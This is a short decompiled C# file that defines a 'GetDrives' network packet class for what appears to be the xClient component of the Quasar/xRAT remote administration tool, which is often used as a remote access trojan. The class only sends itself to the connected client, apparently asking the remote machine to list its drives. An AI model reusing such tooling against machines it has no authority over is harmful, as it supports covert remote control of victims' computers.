using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets
{
	// Token: 0x02000096 RID: 150
	[Serializable]
	public class GetDrives : IPacket
	{
		// Token: 0x060003E9 RID: 1001 RVA: 0x00003F5E File Offset: 0x0000215E
		public void Execute(Client client)
		{
			client.Send<GetDrives>(this);
		}
	}
}
